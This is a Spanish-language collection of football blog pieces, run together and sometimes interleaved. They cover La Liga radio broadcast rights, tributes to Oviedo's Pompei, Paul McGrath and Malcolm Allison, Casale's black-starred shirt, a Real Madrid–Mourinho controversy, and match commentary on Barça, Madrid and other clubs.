de Primera –a excepción del Sevilla, que va por libre- han impedido el paso a las cabinas a los locutores de las diferentes cadenas, que por su parte han utilizado las correspondientes argucias para seguir desempeñando su labor: o bien desde una localidad cualquiera del estadio, o bien desde los correspondientes estudios de radio. La última noticia sobre este asunto saltó hace un par de días, cuando la Liga Profesional pidió a las cadenas de televisión que cortasen la señal a los estudios de las cadenas mayoritarias. Una medida, por cierto, fronteriza entre el pataleo y la mera estupidez, que muestra una vez más la talla intelectual de los máximos dirigentes del fútbol español.Sin embargo, el asunto de los derechos de retransmisión no es estúpido, sino que resulta muy complejo y, sobre todo, opinable. No puede haber un dogma sobre dónde empieza ni acaba el derecho a la información, y por tanto ni unos ni otros pueden arrogarse en un asunto como éste eso tan deseado que es “tener la razón”. El argumento principal de la LFP es que alguien está obteniendo dinero de un espectáculo que organizan ellos, y que lo lógico es recibir su parte del pastel. Las radios, por su parte, esgrimen que toda la vida se han retransmitido gratis los partidos, que ellos también hacen publicidad del fútbol, y que lo que venden no es algo intrínseco al espectáculo, como las imágenes, sino la visión subjetiva del mismo que ofrece un empleado suyo.En realidad, ambas partes invocan argumentos más o menos razonables para defender su tesis.Onopko le devolvió una pared preciosa a Pompei aunque con un pase bombeado, el Tito lo amortiguó con el pecho y con un academicismo insuperable lo colocó en la escuadra izquierda que defendía el Mono Navarro Montoya. Tú y yo lo supimos, lo primero que escuchamos del Tito iba a valer por todo lo demás. Iba a ser tres, dos o uno.Luego pasó lo que pasó en La Romareda. Recuerdo que aquel día el Kily González nos empató el partido jugando con el Zaragoza al hombro pese a que ellos habían quedado con diez por expulsión de Pier tras agredir al Tito, que estaba en todas las pomadas, pero fue lo de menos. El primer gol nuestro fue antológico. Un taconazo del Juanchi González lo hizo bueno Pompei golpeando con violencia la pelota hacia la escuadra derecha de Otto Konrad, aquel austriaco al que le tiraron un petardo en San Mamés. El segundo fue al revés, a balón parado y con suavidad. Cuando aquel tiro encontró la escuadra maña nos dimos cuenta de que el 12 era un jugadorazo. Teníamos al hombre que había marcado de una tacada los tres mejores goles del año en la Liga de las Estrellas. Unbelievable.Pompei tenía un único problema y es que a menudo se le ensanchaba la camiseta a la altura de la barriga, pero mientras estuvo en forma fue un jugador espectacular y tremendamente influyente. Cualquier entrenador veía oro en aquella zurda clínica porque ofrecía soluciones sencillas a los problemas que planteaba el partido. En el Oviedo eran pases medidos a la cabeza de Dely Valdés pero en equipos de mayor nivel como Boca Juniors no era distinto. Hay una anécdota con Carlos Bilardo que deja a las claras el peso del Tito. Boca acaba de renovar la plantilla completamente y pese a contar con talentos como el Kily González, Rambert o Latorre en el once no terminaba de encontrar su juego lo que provocaba los sofocos de Bilardo cada tarde en el banquillo xeneize. En esas situaciones solía tirar indefectiblemente de Pompei para solucionar las dificultades. En casi todos los encuentros de Boca, Bilardo se desgañitaba a gritarle consignas como si el Tito fuera el único capaz de resolverle la papeleta. Dicen que un día, el Narigón no paraba de abroncarle para marcarle una jugada y no se había dado cuenta de que ya lo había sacado y estaba junto a él en el banquillo…Aquel derbi, aquel Sporting‘Don’t Worry, be happy’, ‘Walking on Sushine’ y lo que haga falta. Los silbidos de Bobby McFerrin, Katrina & the Waves y la temporada en la que el Sporting bajó con trece puntos en la mochila son cosas que pasan una vez en la vida. Cualquier oviedista recuerda el 97-98 como un curso de diversión pura y dura. Pompei contribuyó decisivamente a la fiesta, principalmente en El Molinón. Empezamos perdiendo aquello porque Bango decidió marcar un golazo desde la frontal con su clase habitual. Por juego tuvimos que haber perdido en Gijón aquel día pero Juanchi batió a Ablanedo en un barullo y entre Esteban y el árbitro llegamos al final con opciones de ganar. Entonces decidió la clase del Tito, dejando solo a Dely Valdés después de aprovechar con picardía un error garrafal de Bango y sortear la entrada de Sergio. “Le das la vuelta al Marca y Sporting campeón”, se cantaba en la grada; el Tito participó de aquello y solo por eso merece pasar a la historia.Contra el Barcelona y el Madrid‘U can’t touch this’ Como el rap aberrante y ultramachacón de MC Hammer, el Oviedo en época de Pompei era de mírame y no me toques contra los grandes. Al Tito lo recuerdo rompiéndola contra el Barcelona y el Madrid, especialmente contra los catalanes. Eran años en los que el equipo se crecía en este tipo de envites y el argentino siempre daba la cara. En su primer año ganamos 1-0 al Barcelona con gol de Pompei desde el punto de penalti. ¿Por qué no? titulaba la hoja azul el día en que Eugenio Prieto cortó la retransmisión del ‘pay per view’ a mitad de partido denuenciando incumplimiento de contrato. 35.000 abonados, que habían pagado sus 990 pesetas de rigor se quedaron sin ver la victoria del Oviedo y el tanto del Tito. “Hay dos bares a cincuenta metros del campo en los que ven el partido. Tenemos a un guarda jurado allí que nos va informando”, explicó Juan Mesa, gerente del club y encargado aquel día del desalojo audiovisual, al término del choque. El Oviedo mojándole la oreja a los campeones y los clubes cantándole las cuarenta a las televisiones. Definitivamente, era otro fútbol.Ese mismo año recuerdo un gran partido suyo contra el Madrid, arropando a Paulo Bento y asistiendo a Juanchi en el empate, y más adelante, también contra los blancos una exhibición en el Bernabéu frente al Madrid de Toshack. Aquel día acabamos empatando y pudimos golear. En los estertores de la etapa oviedista de Pompei llegó también aquel 3-0 al Barcelona de Van Gaal con gol suyo y dos de Dely Valdés, baile a la defensa blaugrana incluido.Pienso en Pompei como en EMF, McFerrin, Katrina o MC Hammer, maravillas de un día que jamás encontraron continuidad. La música del Tito cesó en 2000 cuando los rumores de salida a otros equipos, Nantes, Marsella, que le acompañaron desde su llegada acabaron por cuajar. El Oviedo decidió malvenderlo a Estudiantes de la Plata justo cuando Radomir Antic comenzaba a perpetrar con los Martinovic, Ivo o Tomic el inolvidable equipo que nos devolvió a Segunda División y abrió la puerta a los barrizales en los que llevamos mil temporadas resbalando. Se fue el Tito, dejó de sonar aquella zurda ‘one hit wonder’ y todo nos cambió para siempre.Foto: @historia_rsg No hubo pastores mentirosos ni lobos. Nada de fábulas, aquelló fue así.Todos se inclinaron ante aquel negro lisiado. Donadoni, Evani, Signori, Roberto Baggio… Uno tras otro rebotaron como ráfagas de metralleta contra una pared blindada. Y es que el cielo de Nueva Jersey no fue lo único que se nubló en aquella tarde húmeda de junio por obra y gracia de una mole irlandesa. El rey de Birmingham tenía las rodillas destrozadas pero unas pelotas tan grandes como el contorno del estadio de los Giants. Era el Mundial del 94 y McGrath vestía esta camiseta.De la mano de Classic Football Shirts , la tienda especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente, desde los uniformes con los que se ha construído la historia del deporte rey.Jack Charlton planteó el asunto al británico modo, elevando el voltaje de medio campo hacia atrás con la electricidad centelleando alrededor de un cromo que Alex Ferguson lamentará haber perdido durante toda su vida. Los italianos, ajenos al truco, quisieron vivir pendientes del cordelito de calidad suprema que unía a Beppe Signori con Roberto Baggio, el ídolo. Y entonces, en el minuto 11 pasa que  Ray Houghton resquebraja las pizarras en mil pedazos y el escenario se torna un frontón irlandés contra las acometidas transalpinas. Emerge entonces Paul MacGrath. “Oh, ah, Paul MacGrath”, bramó con toda su alma cada uno de los miles de emigrantes irlandeses desplazados al evento cada vez que el negro de las rodillas averiadas despejó el balón. Gritaron en cada cabezazo al límite, en cada rascada a ras de hierba, cuando le sacó con la jeta aquella pelota milagrosa a Baggio… Fueron tantas aciones, tal despliegue defensivo, tal masterclass del quite, que el murmullo de la hinchada irlandesa aun debería estar cimbreando los asientos del estadio neoyorquino. McGrath despachó una de las mayores exhibiciones sobre un campo de fútbol que recuerde y aunque a Irlanda se le cepilló Dennis Bergkamp un par de partidos más adelante, América durmió aquella noche con un nuevo rey al mando.Puedes comprar estas camisetas y cientos más en Classic Football Shirts. Habla el Real Madrid, en el comunicado publicado esta tarde al hilo del expediente investigador que la Real Federación Española de Fútbol ha decidido abrirle a José Mourinho, de “clima de tensión creado” Como si toda esta astracanada se tratase de una combustión espontanea. Ya saben, una de esas carbonizaciones de sopetón que tanto fascinan a los amantes de lo paranormal. Afirma la entidad blanca, en el mismo libelo, que “el Real Madrid C. F. ha optado desde un primer momento por una línea de prudencia y responsabilidad”, vertiendo unos gramitos más de paraciencia al batido al obviar que su entrenador prendió la mecha hace tiempo y lleva vigilando para que no se apague desde entonces. Todo en un par de parrafitos que son para verlos y no creerlos.A continuación y sin duda “trabajando en defensa de los valores inherentes a la entidad”, de los que presume en la parte final del comunicado, el Real Madrid muta en fastidioso dedo mourinhista y acusa al Barcelona de malmeter y organizar no se sabe bien qué tipo de caza de brujas, sigamos con lo paranormal, contra el club tildando de paso a la Real Federación Española de Fútbol de mera comparsa al servicio de los caprichos blaugranas. Y lo peor de todo es que para cuando termino de escribir estas líneas, avisen al Guiness, el Real Madrid ya ha publicado dos textos oficiales en los que la autocrítica y el sentido común han brillado tanto por su ausencia que hasta a las mocitas madrileñas se les han subido los colores.Como cantaban Siniestro Total, esto es enorme y monstruoso, tengo que llamar a Jiménez del Oso… Malcolm Allison, el entrenador que parió el mejor Manchester City de la historia ha muerto a los 83 años. El gran Mal, junto con John Mercer, fue el artifice del volantazo más famoso de todos los que haya dado el City en su más que errática historia. Un volantazo que sirvió para depositar en las vitrinas  del desaparecido  Maine Road Liga, Copa y Recopa en el electricante lapso entre 1968 y  1970. Eran los viejos buenos tiempos de Francis Lee, Summerbee y Colin Bell. Piezas de calidad superior que Allison supo ensamblar para crear un producto casi perfecto. Innovador en sus métodos de entrenamiento, inusualmente exigentes para le época, fue además un táctico reconocido. Pero además era además una estrella en toda regla. Para todos a los que se les sabe a mucho la taza que ofrecen José Mourinho,  Pep Guardiola y demás astros de la pizarra Malcolm Allison supondría la muerte por atragantamiento. Para los que hemos leido algo de su historia nunca se nos borrará de la mente la imagen de un vividor, sempiternos sombrero y cigarrillo a la vista, coqueteando con cuanta dama se pusiese a tiro. Malcolm Allison fue, basta echar un vistazo a su hoja de servicios, más grande que la vida.Famosa fue su relación con Christine Keeler, suripanta de la época que provocó un escándalo de dimensiones internacionales por alternar cama con el Ministro de Defensa, John Profumo, y un famoso espía ruso; con la cantante Dorothy Squires y con un rosario interminable de starletts de diverso pelaje. Terry Venables siempre contaba como Allison apareció en  los vestuarios del Crystal Palace de la mano de la estrella del porno Fiona Richmond presto a continuar el tercer tiempo con el resto del equipo en el baño. Imaginen el cuadro. Como hubo foto, la federación le sancionó y el Palace le pueso la maleta en la puerta pero aun hoy se le recuerda en Selhurst Park como uno de los mejores entrenadores que hayan pasado por el club. Lo mismo que en Lisboa, donde condujo al Sporting aun doblete histórico en el 81. Huelga decir que se ido para siempre el mejor entrenador en la historia del Manchester City y una auténtica leyenda del fútbol europeo. Con el cerebro averiado por las fiebres calciófilas, compartidas por cierto con Antonio Agredano, editor de éste su blog, y de nuevo con lo textil como motivo rescato a continuación algo que escribí hace tiempo. Como es costumbre la cosa iba de infrafútbol…Camisetas emblemáticas en el asunto de la pelotita hay muchas. La inmaculada del Real Madrid (importada después a Leeds con mimética admiración por ese paladín de la marullería y el marketing que atendía por Don Revie), una aurinegra de Peñarol, la verdeamarelha brasileña, o una blucerchiata de la Sampdoria son ya, más que trozos de tela útiles, iconos. Pero quizá pocas equipaciones sean tan originales y distintivas como la del Casale italiano. Totalmente negra y adornada tan sólo por una estrella blanca, la nerostellata del Casale cristaliza con clase la historia de uno de los clubes pioneros del   fútbol europeo. El Casale Calcio, habitual del calcio seminal y campeón de Primera en 1914, es un clásico del infrafútbol transalpino. Grande en su infancia pero a años luz de  sus mejores tiempos su sino ahora es cruzar, sin pena ni gloria, la avenida mugrienta que separa la serie C de la D. Sin embargo, la estrella sobre fondo negro todavía es  portada con orgullo por la tifosería del equipo de Casale Monferrato.El curso balompédico de 1909 en la sopa original del calcio es el patio particular de la Pro Vercelli. Los leones blancos conquistan su segundo campeonato consecutivo e imponen ley mientras en Casale Monferrato, el pequeño pueblo del Piamonte,  tan sólo pueden  sentarse a observar con una mezcla de admiración y envidia, los éxitos del vecino poderoso. Es entonces, justo en el año del bicampeonato cuando Raffaelle Jaffe, profesor de ciencias naturales, pare la Associazione Sportiva Casale Calcio con el único objetivo de hacer frente a la hegemonía de la Pro Vercelli. Inmediatamente, y para distinguirse de su odiado rival, que se pasea  por toda Italia enfundado en unas inmaculadas elásticas blancas, el  Casale adopta su mayor  de seña de identidad y el símbolo que mejor le  ha definido durante toda su historia: la casaca totalmente negra con una  estrella blanca. La nerostellata que cumple ahora un siglo de vida.Pero fue cinco temporadas más tarde cuando, enfundados con orgullo en inusual uniforme, el Casale alcanzó contra todo pronóstico el mayor y único éxito de su historia: el campeonato de primera división de 1914.Sin embargo, parece difícil no estar de acuerdo con el hecho de que si alguien organiza un partido tenga potestad para fijar una cantidad de dinero a cualquiera que quiera acceder al recinto para disfrutar de él o para hacer dinero partir de lo que en él ocurre. Por ello, no parece irrazonable que se cobre una cierta cantidad a las cadenas que van a lucrarse a partir del espectáculo, y a cuyos locutores se les facilitan los medios para realizar su trabajo. Desde este punto de vista, igualmente, se hace difícil criticar a las radios por transmitir desde el estudio, por cuanto que lo hacen a través de una señal que han pagado. El razonamiento de la gratuidad consuetudinaria no se sostiene –las cosas son gratis hasta que generan el suficiente interés para dejar de serlo-, es difícil creer que la publicidad del fútbol que genera la radio dé lugar a unos beneficios para los clubes lejanamente cercanos a los que reciben las propias emisoras por los anuncios, y el hecho de la retransmisión subjetiva no choca con la forma de pensar aquí expuesta, por cuanto se cobra por la entrada al estadio; una vez dentro, lo lógico es que la persona pueda contar lo que quiera, sea a una emisora, a un amigo o a su madre. Por otra parte, el derecho a la información puede ser garantizado de muchas maneras que no implican la retransmisión íntegra del partido. Así, nuestra conclusión es que la venta de los derechos de radio tiene sentido, y de hecho se ejerce, por ejemplo, en Reino Unido.Quede claro que el párrafo anterior expresa la opinión del arriba firmante basándose en su propio razonamiento de lo que le parece justo. Otra cosa es lo legal, que al fin y al cabo es la expresión de lo que le parece justo al legislador. Por supuesto, puede que los jueces dictaminen que el derecho a la información implica la retransmisión íntegra, que las radios no puedan emitir a partir de las imágenes de televisión, o que el canon que fije la Liga, en su caso, no sea apropiado. Todo ello es posible, porque, como se ha dicho, en este asunto todo va a depender del razonamiento a partir del que finalmente se consensúe (o se decida) como práctica habitual. Y en cualquier caso, tampoco hay que perder de vista aquienes afirman que lo de las radios es una simple cortina de humo lanzada por los clubes, cuyo auténtico objetivo es la supresión del partido en abierto. Si es así, lo sabremos en próximas fechas. Una serie de tuits en modo ametralladora sobre el partidazo de anoche.1. ¿Puede ser la peor temporada de Casillas desde que está en el Madrid? Sin embargo, creo que dentro del propio  madridismo hay una crítica extradeportiva al portero que creo muy  injusta.2. El primer gol, aparte de gran jugada del Real Madrid, es fallo de Valdés. El balón entra por su palo.3. Una vez más, Messi ha reventado un partido en un momento en que su  equipo era claramente inferior. Él marca, empieza otra cosa. No al  revés.4. Los dos goles finales retratan a CR y a Leo. El primero es vertiginoso,  desmarque, matador. Pero no deja de ser un mano a mano. El de Messi, en cambio, es irse de cuatro, provocar la falta y ponerla en la escuadra. Es un gol de la nada. Indefendible.5. A poco que le salgan medianamente bien las cosas, la banda derecha del Barça será para Montoya en el futuro.6. No he visto nunca un equipo de élite que dependa tanto de un jugador como el Barça de este último año de Messi. Nunca. Tremenda la imagen del argentino celebrando el primer gol. Centenas de goles después, sigue siendo una bestia competitiva.7. El Barça ha demostrado que está preparado para pelear en campo abierto,  el territorio del Madrid. Pero poco a poco se aleja de la ortodoxia.8. Es muy probable que Real Madrid y Barcelona estén al mismo nivel ahora mismo.9. Muy de acuerdo en lo que ha dicho Vilanova sobre Leo y CR. El segundo, un  jugador maravilloso que ha tenido la mala suerte de coincidir con Leo.10. Le leí el otro día a alguien que los clásicos se han convertido en un  contexto ideal para Cristiano. Tenía mucha razón. El crecimiento del  Madrid en este año y medio, Benzema al lado y soltar   el lastre con el  gol de la Copa han cambiado a CR en estos partidos.11. Hay otro hecho poco destacado: la defensa del Barça fue una absoluta improvisación. Hay que verlos con los buenos.12. Como las cosas no cambien radicalmente, el recorrido de Fabregas en el Barça puede ser bastante corto.13. En los catorce clásicos que se han jugado en la era Mourinho, Higuaín ha marcado un gol. En sentido opuesto, cada clásico es una reivindicación del papel de Ozil  en el Madrid. Su peligro es acabar siendo Guti también en lo malo.14. Salvo Arbeloa, los demás titulares  del Real Madrid ayer fueron titulares en el  5-0. Casi todos son mejores jugadores que hace dos años. Mérito de Mou. En lo negativo, el Madrid siempre deja la puerta abierta al rival al  menos un rato. Contra el Ajax tras el gol, ayer los últimos diez minutos.15. Habla también muy bien del respeto que genera el Madrid actual que nadie  da por hecho que la Liga esté resuelta, a pesar de los 8 puntos. Los dos últimos clásicos dejan también media hora de dominio tiránico  del Madrid. Ambos quebrados por chispazos aislados de Messi.16. Mi resumen final es: el Madrid mantiene su línea, la del Barça amenaza  con quebrarse pero tiene a Messi. No sé qué pesará más al final. Tras un partido más sudado que bien jugado, Valencia y Barcelona han empatado (1-1) en Mestalla en su semifinal de la Copa del Rey. Un resultado que puede considerarse justo, ya que valió el tópico de un tiempo para cada equipo. Guardiola envidó con una alineación revolucionaria, con Xavi y Alves fuera –el brasileño entraría más tarde-, y que sufrió mucho ante la presión valenciana de la primera mitad.Jonas adelantó a los locales con un toque de clase tras gran penetración de Mathieu, y poco después empató el Barça con otro cabezazo de Tarzán made in Puyol. Este Barça ha decidido al fin no despreciar los córners, y eso le ayuda a que este año más de sus goles no tengan relación con el juego. Los azulgrana han dado un paso adelante en la segunda y han podido cerrar la eliminatoria, primero en un penalty que le ha parado Diego Alves a Messi y después con un palo del otro Alves, pero el partido ha acabado muriendo entre las señales de cansancio de casi todos los jugadores. Estupendo partido de Banega el eje, el indiscutible faro del Valencia cuando quiere serlo, e imperial Puyol en el otro lado, igual de lateral que de central, y que se acabó desmelenando con dos ruletas encadenadas. Fantástica vuelta aguarda. Una de las razones que se proponen habitualmente para justificar el éxito del fútbol a nivel planetario es su naturaleza discreta; no en el sentido de silenciosa, que no lo es, sino significando que en cada partido se producen un puñado de picos de enorme interés –goles, ocasiones, etc-, más bien escasos, que concentran lo que acaba confiriéndole su individualidad. Esta característica permite que el fútbol sea fácilmente empaquetable en resúmenes, y también la aparición cada poco tiempo de circunstancias llamativas, positivas, negativas o simplemente exóticas, que el espectador no olvida y por tanto dotan al partido en el que suceden de un halo de inmortalidad. No exageramos al afirmar que en muchas ocasiones, la esperanza secreta de que aparezca el evento en cuestión nos anima a presenciar partido tras partido, aunque no sintamos vinculación afectiva alguna con los contendientes y el juego que estemos contemplando no esté resultando brillante. Sabemos que es fútbol, y que en cualquier momento puede saltar la liebre. El sábado la perla apareció en el DW Stadium, y quizá como recompensa a los que mantenemos esa casi infantil mezcla de expectación y curiosidad, por partida doble. No hablaremos demasiado del partido, aunque los futbolistas de Wigan y Blackburn merecen que se recuerde el espléndido 3-3, la agonía vivida sobre el césped hasta el último segundo, dos goles españoles, y cómo quizá este punto sea fundamental para alejarlos a final de temporada del infierno de la Championship.Nos fijaremos en cambio en dos lances que al menos el arriba firmante jamás había presenciado en un campo de fútbol. Con 2-1 en el marcador, David Hoilett deposita el balón con la mano en la media luna del córner, y un momento después llega Pedersen para, ante la incredulidad general, salir jugando tranquilamente el balón. No centrándolo, pasándolo o intentando el gol olímpico, no, no, nada de eso. El amigo penetra paralelo a la línea de meta, cuando le apetece mete el centro raso, el portero Al-Habsi –que estaría esperando a despertar- se la traga, y empate a dos. Increíble. Ni expulsiones, ni penaltis, ni goles anulados, ni fueras de juego; el de Mr. Marriner es uno de los errores técnicos más llamativos y graves jamás vistos en un árbitro profesional. Parecido en apariencia a truquitos como el de Recoba y Estoyanoff, muy diferente en realidad.El partido sigue adelante, llega el descuento, el resultado es apretado y, como ocurre cada vez con más frecuencia, el portero sube a rematar: se trata de Paul Robinson, con esa ilusión en la cabeza que muy escasos cancerberos –inolvidable Palop, frustrado Songo’o– han visto colmada. Pero aunque sea una vez al año eso ya se ve de cuando en cuando, y ha quedado dicho que esta noche es absolutamente especial. Así que cuando su equipo saca el córner y el balón vuela, el pobre Robinson recibe una patada de Kung-Fu que firmaría un Charlie Chan en plena forma. Luego cayó el empate, pero levanten el dedo o pónganlo en comentarios si antes vieron a un portero recibir un penalty. Uno de esos días en los que el fútbol entra en el dominio de lo bizarro, lo surrealista o lo kafkiano. Ver para creer.Vídeo del partido Parece increíble tratándose del mejor equipo del mundo, pero la realidad es que si hoy el Barça no vence en Atenas, completará una Liga de Campeones entera sin conocer la victoria a domicilio; curiosamente, entre medias de una Liga en la que lo ha ganado todo fuera. La mala racha comenzó en Stuttgart con un primer tiempo terrible que a punto estuvo de hipotecar las aspiraciones europeas del equipo, continuó con un empate en el Emirates a todas luces injusto tras la exhibición azulgrana en la primera parte, se prolongó con la derrota en Milán que al final sería definitiva, y ha proseguido este año con dos encuentros poco brillantes en Kazán y Copenhague, donde las igualadas se dieron por buenas.Vistos estos precedentes, y a pesar de que aún resta el encuentro contra el Rubin Kazan el Camp Nou a modo de colchón de seguridad, parece ser que Guardiola va a primar el encuentro de hoy sobre el clásico del próximo lunes, y se va a presentar en el estadio Spyros Louis –de amargo recuerdo para él, por otra parte- luciendo sus mejores galas y con toda la artillería que hizo papilla al Almería el sábado pasado. Habida cuenta de la diferencia entre las dos escuadras, es presumible que el preparador de Santpedor tenga en mente matar el partido cuanto antes, para poder dar descanso en el segundo tiempo a alguno de sus jugadores más castigados. Como posibles novedades se apunta a la presencia de Keita en el medio, o a la posibilidad de que Adriano ocupe la banda izquierda, toda vez que Abidal aún tiene algunas molestias.Enfrente, se presenta el Panathinaikos de Jesualdo Ferreira, que ha encontrado muy pronto acomodo tras su petardazo en Málaga. El técnico portugués dice no tener miedo al Barcelona –quizá porque no sufrió en primera persona la paliza del Camp Nou- y la moral del equipo ha remontado un poco tras su sufrida victoria ante el Iraklis el fin de semana pasado. La principal incógnita es la presencia o no del veterano Govou, autor del gol en el partido de ida, que últimamente ha disfrutado más de la cuenta de la noche ateniense y que, como suele ocurrir cuando los equipos no van bien, ha sido denunciado. El otro ex del Lyon, Boumsong, vuelve tras una lesión, y faltará igualmente el argentino Leto. Así las cosas, la mayor amenaza para el Barça será el instinto de Djibril Cissé, recuperado para el fútbol tras las gravísimas lesiones que le sacaron de la élite, y que está completando una buena temporada. En cualquier caso, todo resultado que no sea una victoria azulgrana va a hacer rico hoy a más de uno, ya que el favoritismo de los catalanes es máximo. Si por algo suspiran la mayor parte de los clubes que pueblan la Primera División es por un matador. Fuera de los grandes, no son demasiados los equipos que por suerte, buen ojo o mejor inversión poseen a ese ansiado delantero que, más allá de su juego, garantiza los goles que permiten acercarse a los objetivos marcados. Buenos ejemplos tenemos en Coruña, Santander o Pamplona, con equipos que han desarrollado o desarrollan con solvencia una buena idea de juego, pero que partido tras partido sufren, padecen o directamente se estrellan por la ausencia de gol. Ayer, por ejemplo, conocíamos la escalofriante estadística de que ningún futbolista de la primera plantilla del Deportivo ha firmado, nunca, más de diez goles en una temporada de Primera División.Por todo esto, resulta llamativa una jornada que nos ha traído dos dobletes de delanteros centros que prometen convertirse en un seguro para los equipos cuya formación cierran. El más conocido, sin duda, es David Trezeguet, una vieja gloria que acaba de llegar a Alicante, de donde es originaria su mujer, en busca de un clima mejor –qué frío junto a los Alpes, según confesión propia-, de una liga diferente, y de un equipo de nivel medio donde apurar los últimos años de su carrera. Podría parecer que el bueno de David ha buscado un retiro dorado donde cubrirse el riñón, pero parece que, al menos de momento, el goleador impenitente de la Juve y héroe de Francia en 2000 se ha implicado en el proyecto del Hércules; ojo, porque a buen nivel es uno de los últimos grandes rematadores puros que quedan en un fútbol mundial que poco a poco los arrincona. El domingo fue un dolor de cabeza para la defensa del Sevilla, y aparte de su magnífico gol llegando al espacio vacío, dejó un puñado de desmarques y apariciones en las que se mostró tan amenazador como ha resultado durante toda su carrera.Menos conocido para el gran público es Fernando Cavenaghi, que se destapó anoche con otro doblete. El Torito ha llegado cedido a Mallorca procedente de un Girondins donde dejó cierta huella, resultando incluso máximo goleador en 2009. Un goleador solvente, con olfato para seguir la jugada y que, cualidad importante, necesita muy poco tiempo para armar la pierna y chutar con peligro. Salido de un River donde se le comparaba con Batistuta –palabras mayores, por otro lado- con rumbo a una Rusia donde no acabó de adaptarse, Cavenaghi puede aliviar a Chori Castro de responsabilidad en el Mallorca, a la vez que ofrecerle una gran salida para sus penetraciones por la izquierda. El domingo nos dejó un chicharro marca de la casa, de los que repetirá casi con total seguridad muy pronto, y otro de cazagoles para afianzar resultado y engordar estadística. Dos equipos, dos killers, dos goles. Y seguramente, lo mejor está por llegar. No por ser más reciente y estar en la memoria de todos deja esta historia de ser mito inmediato. La actuación de Zidane en la final de Alemania 06 admite infinitas lecturas, y sería un excelente punto de partida para una o múltiples películas o novelas: la reproducción de la genialidad absoluta cuando más difícil es hacerlo, el líder cansado que conduce a los suyos por última vez a la puerta del paraíso, la encrucijada en el momento postrero, la vulnerabilidad del héroe que acaba como villano,la mutación del villano de manual que se convierte en héroe para los suyos, o la negación rotunda y cortante de un happy end. Noventa minutos en los que el bailarín se jugó un pulso con la posteridad, y perdió.Desbancó, por supuesto y para regocijo de toda la  ciudad, a la Pro Vercelli pero también a los conjuntos más potentes del momento entre los que se encontraban Inter, Genoa, Verona o la mismísima Juventus de Turín. Entonces con el scudetto en la vitrina y la Pro Vercelli humillada, la misión que  los fundadores del Casale se habían impuesto con la creación del equipo  se había cumplido con creces. Quizá por ello y como si de cerrar la  historia de manera perfecta se tratase,  la estrella del Casale se fue apagando  lentamente tras la hazaña, empañando su brillo año a año, hasta que con la llegada del profesionalismo el club comenzó su paseo agridulce y sereno hasta las barriadas más humildes del infrafútbol transalpino de las que hoy es inquilino habitual. 1990. Un joven Andre Agassi, tan talentoso como desesperado por encontrar su lugar en el mundo, recurre al preparador Gil Reyes. Ese tío hace del entrenamiento una ciencia y de la motivación un arte. Tras la enésima derrota, cenan bajo la noche iluminada sobre el capó del coche y Reyes le espeta un discurso detonante. “En algún lugar ahí arriba hay una estrella que lleva tu nombre. Quizá no pueda ayudarte a encontrarla, pero tengo hombros fuertes y puedes subirte a ellos mientras tratas de buscarla. ¿Me oyes? Súbete a mis hombros y busca, tío. Busca” Anoche, mientras regresaba por carretera a Madrid bajo la noche estrellada, rumiando el empate, recordé este pasaje de la brutal autobiografía de Agassi y pensé en Cervero.Decidir continuar en el Athletic sería engañarse a sí mismo, primero, y a todo lo que el club de su vida representa, después. Su marcha, tras toda una vida como rojiblanco, duele especialmente en el Botxo. Como dolió la de Julen, o como dolerá la de Carlos Gurpegui. Porque en Bilbao no somos de idolatrar egos excesivos ni de admirar una colección de Audis ronroneando en rotondas. Tampoco de ensalzar actuaciones para la galería. Somos más de andar por casa. De destacar lo cotidiano y todo aquello que hace que el Athletic nos resulte tan cercano y real, que nos haga creer que sigue siendo ‘nuestro’ Athletic. En un fútbol mediatizado en exceso en el que la distancia entre el césped y los aficionados es sideral y con tendencia a seguir aumentando, Andoni, tímido y discreto, ha sido uno de esos futbolistas empeñados en comportarse de manera normal. En demostrarnos a todos que no hace falta estar por encima del bien y del mal para ser un futbolista de primer nivel. Por eso idolatramos en Bilbao a Andoni Iraola. Por eso ayer le despedimos con honores, pero sin ruido mediático. Ensimismados ante la sencillez de un chaval que podría ser nuestro vecino, nuestro primo o nuestro antiguo compañero de instituto. Porque puede ser que Andoni tuviera razón y el fútbol actual ya no tenga hueco para un futbolista como él. Cédric Bakambu. Rescatado de Turquía por el Villarreal (tras una notable temporada en las filas del Bursaspor), el delantero francocongoleño firmó el pasado viernes una de esas actuaciones personales, en su debut ante su nuevo público, que solo pueden augurar un futuro inmediato repleto de buenos momentos. Su técnico lo introdujo en el campo con media hora por delante y un 0-1 en contra. Revolucionó la vanguardia amarilla y de su prometedora sociedad con Soldado nacieron el segundo y tercer gol, sus dos primeras dianas en la liga española.Una sorprendente estadística sacude Europa: si sumamos la distancia en puntos de los líderes de las cuatro grandes ligas a sus inmediatos perseguidores, obtenemos la friolera de 27 puntos, más de seis de media. El resultado, con matices, nos habla de que acaba de comenzar la temporada y al menos dos de estos torneos están casi decididos y otro está en camino. Merece la pena, por tanto, detenerse un poco en cada caso para ver qué ha ocurrido en estos meses tan atípicos.España. Aquí el Barça de Tito Vilanova comanda la Liga a golpe de récord, y ve muy a lo lejos a un Madrid envuelto en los tinglados habituales que se montan en torno al club blanco en cuanto la distancia con el líder pasa un límite que los once puntos superan holgadamente. Más cerca está una estupenda versión del Atleti, que necesita sin embargo un golpe en la mesa frente a un grande para convencer a los escépticos de su competitividad. Probablemente sea el club rojiblanco  el que esté rayando más alto a nivel colectivo, pero cuenta poco ese enorme mérito cuando por encima tiene a un tipo que te hace comenzar casi cualquier partido con dos goles de ventaja, lo juegues bien, regular o mal. Cada vez somos más los que sólo podemos imaginar un campeonato abierto en (indeseable) ausencia de Messi.Inglaterra. Por regla general, el despido de un entrenador a los dos meses de comenzar la temporada no suele resultar una buena política, además de que asume el reconocimiento de un fracaso. Sin embargo, toda regla tiene sus excepciones, y cada vez queda menos gente que defienda a un Mancini que está consiguiendo en el City máximos en el desaprovechamiento de recursos. La mejor plantilla de la Premier, a años de luz de cualquiera de sus rivales, viene de firmar un ridículo memorable en Champions y ayer pudo salir goleado en casa por el United de no haber mediado un fallo del asistente que privó a su rival del 0-3. Una versión de los red devils que parece netamente inferior al equipo de 2008, pero que el año pasado no fue campeona doméstica por errores propios, y que este año ya ha puesto tierra de por medio (seis puntos) ante un enemigo que está descompuesto. Sólo una medida drástica del jeque parece capaz de invertir el destino.Alemania. Pocos que sigan el fútbol internacional podrán dudar que, al máximo nivel, el Borussia Dortmund está entre los cinco o seis mejores equipos de Europa. Sin embargo, los pupilos de Klopp han padecido dos síndromes de manual que les han empequeñecido recientemente más de lo que merecían: la bisoñez en la Champions el año pasado, que los sacó del panorama en la fase de grupos, 